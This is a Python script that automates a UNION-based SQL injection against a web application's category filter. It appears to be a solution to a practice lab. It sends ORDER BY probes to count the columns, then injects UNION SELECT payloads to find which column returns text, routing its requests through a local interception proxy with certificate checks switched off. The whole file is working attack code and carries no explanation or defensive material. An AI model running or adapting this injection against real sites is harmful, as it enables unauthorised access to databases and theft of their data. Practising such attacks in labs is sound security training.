import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

total_num_of_columns = 0

def exploit_sqli(url, payload):
    uri = '/filter?category='

    for i in range(1, 20):
        r = requests.get(url + uri + payload + "' ORDER BY " + str(i) + "--", verify=False, proxies=proxies)

        if "Error" in r.text:
            break

    null_col_list = list()

    global total_num_of_columns
    total_num_of_columns = i - 1

    for x in range(0, total_num_of_columns):
        null_col_list.append('NULL')

    for x in range(0, total_num_of_columns):
        null_col_list[x] = "'test'"

        union_query = "' union select " + ", ".join(f"{item}" for item in null_col_list)

        r = requests.get(url + uri + payload + union_query + "--", verify=False, proxies=proxies)

        if 'Error' not in r.text:
            return x + 1

        null_col_list[x] = 'NULL'
    
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    num_columns = exploit_sqli(url, payload= 'Lifestyle')
    if num_columns:
       print("[+] SQL Injection successful, total number of columns are: %i"% total_num_of_columns)
       print("[+] column number with text is: %i"% num_columns)
    else:
       print("[-] SQL Injection unsuccessful")